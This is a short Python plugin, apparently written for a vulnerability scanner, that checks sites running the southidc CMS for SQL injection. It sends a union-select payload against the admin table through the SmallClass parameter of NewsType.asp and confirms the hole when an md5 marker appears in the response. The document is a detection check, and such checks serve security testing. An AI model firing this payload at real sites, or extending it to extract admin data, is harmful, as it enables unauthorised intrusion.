# !/usr/bin/dev python
# -*- coding:utf-8 -*-

import re
import hashlib
import time

"""
reference:
http://www.beebeeto.com/pdb/poc-2014-0036/
"""


def assign(service, arg):
    if service == 'southidc':
        return True, arg



def audit(arg):
    verify_url = arg + '/NewsType.asp?'
    payload = """SmallClass=%27%20union%20select%200,md5(3.14),2,3,4,5,6,7,8,9%20from%20admin%20%27%27=%27"""
    url = verify_url + payload
    #print "[*] Request URL: \n" + url
    code, head, res, _, _ = curl.curl(url)
    if code == 200:
        if '4beed3b9c4a886067de0e3a094246f78' in res:
            security_hole(url)
    pass


if __name__ == "__main__":
    from dummy import *
    audit(assign('southidc', 'http://www.exapmle.com')[1])